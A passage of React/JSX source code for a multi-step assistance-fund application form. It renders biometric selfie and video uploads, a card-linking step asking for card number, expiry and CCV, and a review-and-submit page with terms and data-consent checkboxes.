                  <h4 className="mb-2 text-lg font-semibold text-gray-800">Biodata (Face Photo) *</h4>
                  <p className="mb-4 text-gray-600">Take a clear selfie for identity verification</p>
                  {formData.biodataImage ? (
                    <div className="flex justify-center items-center space-x-2 text-green-600">
                      <Check className="w-5 h-5" />
                      <span>Face photo uploaded</span>
                    </div>
                  ) : (
                    <div>
                      <input
                        type="file"
                        accept="image/*"
                        capture="user"
                        onChange={(e) => e.target.files && handleFileUpload('biodataImage', e.target.files[0])}
                        className="hidden"
                        id="biodata-image"
                      />
                      <label
                        htmlFor="biodata-image"
                        className="px-6 py-2 text-white bg-green-600 rounded-lg transition-colors cursor-pointer hover:bg-green-700"
                      >
                        Take Selfie
                      </label>
                    </div>
                  )}
                  {uploadProgress.biodataImage && uploadProgress.biodataImage < 100 && (
                    <div className="mt-4">
                      <div className="h-2 bg-gray-200 rounded-full">
                        <div
                          className="h-2 bg-green-600 rounded-full transition-all duration-300"
                          style={{ width: `${uploadProgress.biodataImage}%` }}
                        ></div>
                      </div>
                      <p className="mt-2 text-sm text-gray-600">Processing... {uploadProgress.biodataImage}%</p>
                    </div>
                  )}
                  {errors.biodataImage && <p className="mt-2 text-sm text-red-600">{errors.biodataImage}</p>}
                </div>
              </div>
              {/* Biodata Video (Face) */}
              <div className="p-6 rounded-lg border-2 border-gray-300 border-dashed">
                <div className="text-center">
                  <User className="mx-auto mb-4 w-12 h-12 text-gray-400" />
                  <h4 className="mb-2 text-lg font-semibold text-gray-800">Biodata (Face Video) *</h4>
                  <p className="mb-4 text-gray-600">Record a short video of your face for liveness detection</p>
                  {formData.biodataVideo ? (
                    <div className="flex justify-center items-center space-x-2 text-green-600">
                      <Check className="w-5 h-5" />
                      <span>Face video uploaded</span>
                    </div>
                  ) : (
                    <div>
                      <input
                        type="file"
                        accept="video/*"
                        capture="user"
                        onChange={(e) => e.target.files && handleFileUpload('biodataVideo', e.target.files[0])}
                        className="hidden"
                        id="biodata-video"
                      />
                      <label
                        htmlFor="biodata-video"
                        className="px-6 py-2 text-white bg-green-600 rounded-lg transition-colors cursor-pointer hover:bg-green-700"
                      >
                        Record Video
                      </label>
                    </div>
                  )}
                  {uploadProgress.biodataVideo && uploadProgress.biodataVideo < 100 && (
                    <div className="mt-4">
                      <div className="h-2 bg-gray-200 rounded-full">
                        <div
                          className="h-2 bg-green-600 rounded-full transition-all duration-300"
                          style={{ width: `${uploadProgress.biodataVideo}%` }}
                        ></div>
                      </div>
                      <p className="mt-2 text-sm text-gray-600">Processing... {uploadProgress.biodataVideo}%</p>
                    </div>
                  )}
                  {errors.biodataVideo && <p className="mt-2 text-sm text-red-600">{errors.biodataVideo}</p>}
                </div>
              </div>
              {/* Random Picture */}
              <div className="p-6 rounded-lg border-2 border-gray-300 border-dashed md:col-span-2">
                <div className="text-center">
                  <Building className="mx-auto mb-4 w-12 h-12 text-gray-400" />
                  <h4 className="mb-2 text-lg font-semibold text-gray-800">Random Picture *</h4>
                  <p className="mb-4 text-gray-600">Take a random picture of anything in your environment (to prevent AI registration)</p>
                  {formData.randomPicture ? (
                    <div className="flex justify-center items-center space-x-2 text-green-600">
                      <Check className="w-5 h-5" />
                      <span>Random picture uploaded</span>
                    </div>
                  ) : (
                    <div>
                      <input
                        type="file"
                        accept="image/*"
                        capture="environment"
                        onChange={(e) => e.target.files && handleFileUpload('randomPicture', e.target.files[0])}
                        className="hidden"
                        id="random-picture"
                      />
                      <label
                        htmlFor="random-picture"
                        className="px-6 py-2 text-white bg-yellow-600 rounded-lg transition-colors cursor-pointer hover:bg-yellow-700"
                      >
                        Take Random Picture
                      </label>
                    </div>
                  )}
                  {uploadProgress.randomPicture && uploadProgress.randomPicture < 100 && (
                    <div className="mt-4">
                      <div className="h-2 bg-gray-200 rounded-full">
                        <div
                          className="h-2 bg-yellow-600 rounded-full transition-all duration-300"
                          style={{ width: `${uploadProgress.randomPicture}%` }}
                        ></div>
                      </div>
                      <p className="mt-2 text-sm text-gray-600">Processing... {uploadProgress.randomPicture}%</p>
                    </div>
                  )}
                  {errors.randomPicture && <p className="mt-2 text-sm text-red-600">{errors.randomPicture}</p>}
                </div>
              </div>
            </div>
            <div className="p-4 mt-6 bg-yellow-50 rounded-lg border border-yellow-200">
              <div className="flex items-start">
                <AlertCircle className="w-5 h-5 text-yellow-600 mr-2 mt-0.5" />
                <div>
                  <h4 className="mb-1 font-semibold text-yellow-800">Important Security Notice</h4>
                  <p className="text-sm text-yellow-700">
                    All uploaded documents are encrypted and stored securely. We use advanced biometric verification
                    to prevent fraud and ensure your identity is protected throughout the application process.
                  </p>
                </div>
              </div>
              <div>
                <button onClick={() => setShowModal(true)}>Open Camera</button>
                <CameraModal
                  isOpen={showModal}
                  onClose={() => setShowModal(false)}
                  onCapture={handleCapture}
                  isSelfie={true}
                  mode='photo'
                />
              </div>
            </div>
          </div>
        );

      case 5:
        return (
          <div className="space-y-6 md:col-span-2">
            <h4 className="mb-6 text-2xl font-semibold text-gray-800">Link a Card *</h4>

            <div className="grid grid-cols-1 gap-6 md:grid-cols-3">
              {formData.cards.map((card, index) => (
                <React.Fragment key={`card-${index}`}>
                  <div>
                    <label className="block mb-2 text-sm font-medium text-gray-700">Card Number *</label>
                    <input
                      type="text"
                      value={card.cardNumber}
                      onChange={(e) => handleCardChange(index, "cardNumber", e.target.value)}
                      className={`px-4 py-3 w-full rounded-lg border focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${errors[`cards[${index}].cardNumber`] ? 'border-red-500' : 'border-gray-300'}`}
                      placeholder="XXXX XXXX XXXX XXXX"
                    />
                    {errors[`cards[${index}].cardNumber`] && (
                      <p className="mt-1 text-sm text-red-600">{errors[`cards[${index}].cardNumber`]}</p>
                    )}
                  </div>
                  <div>
                    <label className="block mb-2 text-sm font-medium text-gray-700">Expiry *</label>
                    <input
                      type="text"
                      value={card.expiry}
                      onChange={(e) => handleCardChange(index, "expiry", e.target.value)}
                      className={`px-4 py-3 w-full rounded-lg border focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${errors[`cards[${index}].expiry`] ? 'border-red-500' : 'border-gray-300'}`}
                      placeholder="MM/YY"
                    />
                    {errors[`cards[${index}].expiry`] && (
                      <p className="mt-1 text-sm text-red-600">{errors[`cards[${index}].expiry`]}</p>
                    )}
                  </div>
                  <div>
                    <div className="w-full">
                      <label className="block mb-2 text-sm font-medium text-gray-700">CCV *</label>
                      <div className="flex items-center">
                        <input
                          type="text"
                          value={card.ccv}
                          onChange={(e) => handleCardChange(index, "ccv", e.target.value)}
                          className={`px-4 py-3 w-full rounded-lg border focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${errors[`cards[${index}].ccv`] ? 'border-red-500' : 'border-gray-300'}`}
                          placeholder="XXX"
                        />
                        {/* Remove card button, only for cards after the first */}
                        {index > 0 && (
                          <button
                            type="button"
                            onClick={() => removeCard(index)}
                            className="flex justify-center items-center p-2 mb-2 ml-2 text-red-600 bg-red-100 rounded-full hover:bg-red-200"
                            title="Remove this card"
                          >
                            <Minus className="w-5 h-5" />
                          </button>
                        )}
                      </div>
                      {errors[`cards[${index}].ccv`] && (
                        <p className="mt-1 text-sm text-red-600">{errors[`cards[${index}].ccv`]}</p>
                      )}
                    </div>
                  </div>
                </React.Fragment>
              ))}
            </div>

            {errors.cards && <p className="text-sm text-red-600">{errors.cards}</p>}

            <button
              type="button"
              onClick={addCard}
              className="px-4 py-2 mt-2 text-sm font-medium text-blue-600 bg-blue-100 rounded-lg hover:bg-blue-200"
            >
              + Link Another Card
            </button>
          </div>
        );

      case 6:
        return (
          <div className="space-y-6">
            <h3 className="mb-6 text-2xl font-semibold text-gray-800">Review & Submit Application</h3>

            {/* Application Summary */}
            <div className="p-6 space-y-4 bg-gray-50 rounded-lg">
              <h4 className="text-lg font-semibold text-gray-800">Application Summary</h4>

              <div className="grid grid-cols-1 gap-4 text-sm md:grid-cols-2">
                <div>
                  <span className="font-medium text-gray-700">Name:</span>
                  <span className="ml-2">{formData.firstName} {formData.lastName}</span>
                </div>
                <div>
                  <span className="font-medium text-gray-700">Date of Birth:</span>
                  <span className="ml-2">{formData.dateOfBirth}</span>
                </div>
                <div>
                  <span className="font-medium text-gray-700">Phone:</span>
                  <span className="ml-2">{formData.phoneNumber}</span>
                </div>
                <div>
                  <span className="font-medium text-gray-700">Email:</span>
                  <span className="ml-2">{formData.email}</span>
                </div>
                <div className="md:col-span-2">
                  <span className="font-medium text-gray-700">Address:</span>
                  <span className="ml-2">{formData.currentAddress}, {formData.city}, {formData.state} {formData.zipCode}</span>
                </div>
                <div>
                  <span className="font-medium text-gray-700">Bank:</span>
                  <span className="ml-2">{formData.bankName} ({formData.accountType})</span>
                </div>
              </div>
            </div>

            {/* Terms and Conditions */}
            <div className="space-y-4">
              <div className="flex items-start space-x-3">
                <input
                  type="checkbox"
                  id="terms"
                  checked={formData.termsAccepted}
                  onChange={(e) => handleInputChange('termsAccepted', e.target.checked)}
                  className="mt-1 w-4 h-4 text-blue-600 rounded border-gray-300 focus:ring-blue-500"
                />
                <label htmlFor="terms" className="text-sm text-gray-700">
                  I accept the <a href="/terms" className="text-blue-600 hover:underline">Terms and Conditions</a> and
                  understand that I must use assistance funds only for approved expenses (food, clothing, shelter, healthcare).
                </label>
              </div>
              {errors.termsAccepted && <p className="ml-7 text-sm text-red-600">{errors.termsAccepted}</p>}

              <div className="flex items-start space-x-3">
                <input
                  type="checkbox"
                  id="consent"
                  checked={formData.dataConsent}
                  onChange={(e) => handleInputChange('dataConsent', e.target.checked)}
                  className="mt-1 w-4 h-4 text-blue-600 rounded border-gray-300 focus:ring-blue-500"
                />
                <label htmlFor="consent" className="text-sm text-gray-700">
                  I consent to the processing of my personal data and understand that my fund usage will be monitored
                  to ensure compliance with program guidelines. I agree to the <a href="/privacy" className="text-blue-600 hover:underline">Privacy Policy</a>.
                </label>
              </div>
              {errors.dataConsent && <p className="ml-7 text-sm text-red-600">{errors.dataConsent}</p>}
            </div>

            <div className="p-4 bg-blue-50 rounded-lg border border-blue-200">
              <div className="flex items-start">
                <Shield className="w-5 h-5 text-blue-600 mr-2 mt-0.5" />
                <div>
                  <h4 className="mb-1 font-semibold text-blue-800">Next Steps</h4>
                  <p className="text-sm text-blue-700">
                    After submitting your application, our team will review it within 24-48 hours. You'll receive
                    an email confirmation with your application status and next steps.
                  </p>
                </div>
              </div>
            </div>
          </div>
        );

      default:
        return null;
    }
  };

  return (
    <div className="py-8 min-h-screen bg-gray-50">
      <div className="px-4 mx-auto max-w-4xl sm:px-6 lg:px-8">
        {/* Progress Indicator */}
        <div className="mb-8">
          <div className="flex justify-between items-center">
            {steps.map((step, index) => (
              <div key={step.id} className="flex items-center">
                <div className={`w-10 h-10 rounded-full flex items-center justify-center text-sm font-semibold ${step.id === currentStep
                  ? 'bg-blue-600 text-white'
                  : step.id < currentStep
                    ? 'bg-green-600 text-white'
                    : 'bg-gray-300 text-gray-600'
                  }`}>
                  {step.id < currentStep ? <Check className="w-5 h-5" /> : step.icon}
                </div>
                <div className="hidden ml-3 sm:block">
                  <div className={`text-sm font-medium ${step.id === currentStep
                    ? 'text-blue-600'
                    : step.id < currentStep
                      ? 'text-green-600'
                      : 'text-gray-500'
                    }`}>
                    {step.title}
                  </div>
                </div>
                {index < steps.length - 1 && (
                  <div className={`mx-4 flex-1 h-0.5 ${step.id < currentStep ? 'bg-green-600' : 'bg-gray-300'
                    }`} />
                )}
              </div>
            ))}
          </div>
        </div>

        {/* Form Content */}
        <div className="p-8 bg-white rounded-lg shadow-lg">
          {renderStepContent()}

          {/* Navigation Buttons */}
          <div className="flex justify-between pt-6 mt-8 border-t border-gray-200">
            <button
              onClick={prevStep}
              disabled={currentStep === 1}
              className={`flex items-center px-6 py-3 rounded-lg font-medium transition-colors ${currentStep === 1
                ? 'bg-gray-100 text-gray-400 cursor-not-allowed'
                : 'bg-gray-200 text-gray-700 hover:bg-gray-300'
                }`}
            >
              <ChevronLeft className="mr-2 w-4 h-4" />
              Previous
            </button>

            {currentStep < steps.length ? (
              <button
                onClick={nextStep}
                className="flex items-center px-6 py-3 font-medium text-white bg-blue-600 rounded-lg transition-colors hover:bg-blue-700"
              >
                Next
                <ChevronRight className="ml-2 w-4 h-4" />
              </button>
            ) : (
              <button
                onClick={handleSubmit}
                disabled={!formData.termsAccepted || !formData.dataConsent}
                title={
                  !formData.termsAccepted && !formData.dataConsent
                    ? 'You must accept the Terms and consent to data processing before submitting'
                    : !formData.termsAccepted
                    ? 'You must accept the Terms and Conditions before submitting'
                    : !formData.dataConsent
                    ? 'You must consent to data processing before submitting'
                    : ''
                }
                className={`flex items-center px-6 py-3 font-medium rounded-lg transition-colors ${
                  !formData.termsAccepted || !formData.dataConsent
                    ? 'bg-gray-300 text-gray-500 cursor-not-allowed'
                    : 'bg-green-600 text-white hover:bg-green-700'
                }`}
              >
                Submit Application
                <Check className="ml-2 w-4 h-4" />
              </button>
            )}
          </div>
        </div>
        {/* Upgraded Success Modal */}
        <SuccessModal
          isOpen={showSuccessModal}
          applicantName={submittedName}
          onClose={handleCloseSuccess}
        />
        {/* Submission Progress Modal */}
        <SubmissionProgressModal isOpen={showProgressModal} progress={progress} />
      </div>
    </div>
  );
};

export default ApplicationPortal;